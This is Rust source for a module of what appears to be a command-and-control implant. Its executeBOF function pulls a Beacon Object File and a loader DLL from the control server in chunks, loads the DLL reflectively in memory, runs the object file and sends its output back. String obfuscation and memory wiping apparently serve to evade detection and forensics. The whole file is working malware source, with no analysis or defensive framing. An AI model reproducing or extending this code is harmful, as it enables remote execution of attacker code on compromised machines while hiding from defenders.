use serde::Deserialize;
use serde_json::{Value, json};
use base64::engine::general_purpose;
use base64::Engine;
use obfstr::obfstr;

const CHUNK_SIZE: usize = 4096;

#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    parameters: String,
    #[serde(default)]
    loader_file_id: String,
}

pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
    let params: UploadParams = serde_json::from_str(raw)?;
    let file_id = &params.file_id;

    let mut file_bytes = Vec::new();
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    while chunk_num <= total_chunks {
        let payload = json!({
            obfstr!("action"): obfstr!("post_response"),
            obfstr!("responses"): [{
                obfstr!("upload"): {
                    obfstr!("chunk_size"): CHUNK_SIZE,
                    obfstr!("file_id"): file_id,
                    obfstr!("chunk_num"): chunk_num,
                },
                obfstr!("task_id"): id,
                obfstr!("completed"): true
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp[obfstr!("responses")][0];
        total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad `total_chunks`")? as usize;
        let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing `chunk_data`")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }

    crate::helpers::churn(file_bytes.as_slice());

    if !params.loader_file_id.is_empty() && !crate::loader_cache::is_cached(&crate::loader_cache::LoaderKind::Bof) {
        let mut loader_bytes = Vec::new();
        let mut chunk_num = 1;
        let mut total_chunks = 1;

        while chunk_num <= total_chunks {
            let payload = json!({
                obfstr!("action"): obfstr!("post_response"),
                obfstr!("responses"): [{
                    obfstr!("upload"): {
                        obfstr!("chunk_size"): CHUNK_SIZE,
                        obfstr!("file_id"): params.loader_file_id,
                        obfstr!("chunk_num"): chunk_num,
                    },
                    obfstr!("task_id"): id,
                    obfstr!("completed"): true
                }]
            })
            .to_string();
            let resp: Value = crate::transport::send_request_with_response(&payload)?;
            let entry = &resp[obfstr!("responses")][0];
            total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad loader `total_chunks`")? as usize;
            let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing loader `chunk_data`")?;
            let bytes = general_purpose::STANDARD.decode(chunk_data)?;
            loader_bytes.extend_from_slice(&bytes);
            chunk_num += 1;
        }

        crate::loader_cache::store(&crate::loader_cache::LoaderKind::Bof, loader_bytes);
    }

    let loader_dll = match crate::loader_cache::get(&crate::loader_cache::LoaderKind::Bof) {
        Ok(dll) => dll,
        Err(e) => {
            let done = json!({
                obfstr!("action"): obfstr!("post_response"),
                obfstr!("responses"): [{obfstr!("task_id"): id, obfstr!("user_output"): format!("BOF loader not available: {}. Run 'loadLoader bof' first.", e), obfstr!("status"): "error", obfstr!("completed"): true}]
            }).to_string();
            crate::transport::send_request(&done)?;
            return Ok(());
        }
    };

    let args = crate::beacon_pack::pack_args(&params.parameters)
        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

    crate::helpers::churn(args.as_slice());

    let (output, status) = unsafe {
        let module = crate::reflective_loader::load(&loader_dll)
            .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

        crate::mem_wipe::wipe(loader_dll.as_ptr() as *mut u8, loader_dll.len());

        let execute_fn = module.get_export("execute_bof")
            .ok_or("execute_bof export not found")?;

        type ExecuteBofFn = unsafe extern "C" fn(*const u8, usize, *const u8, usize, *mut *mut u8, *mut usize) -> i32;
        let execute: ExecuteBofFn = core::mem::transmute(execute_fn);

        let mut out_ptr: *mut u8 = std::ptr::null_mut();
        let mut out_len: usize = 0;

        let (args_ptr, args_len) = if args.is_empty() {
            (std::ptr::null(), 0)
        } else {
            (args.as_ptr(), args.len())
        };

        let ret = execute(
            file_bytes.as_ptr(), file_bytes.len(),
            args_ptr, args_len,
            &mut out_ptr, &mut out_len,
        );

        let output = if !out_ptr.is_null() && out_len > 0 {
            let s = String::from_utf8_lossy(std::slice::from_raw_parts(out_ptr, out_len)).to_string();
            crate::mem_wipe::wipe(out_ptr, out_len);
            let _ = Vec::from_raw_parts(out_ptr, out_len, out_len);
            s
        } else {
            String::new()
        };

        module.unload();
        crate::mem_wipe::wipe_vec(&mut file_bytes);
        if !args.is_empty() {
            crate::mem_wipe::wipe(args.as_ptr() as *mut u8, args.len());
        }

        let status = if ret == 0 { "success" } else { "error" };
        (output, status)
    };

    crate::helpers::churn(output.as_str());

    let done = json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("user_output"): output,
            obfstr!("agent_file_id"): file_id,
            obfstr!("status"): status,
            obfstr!("completed"): true
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;
    Ok(())
}
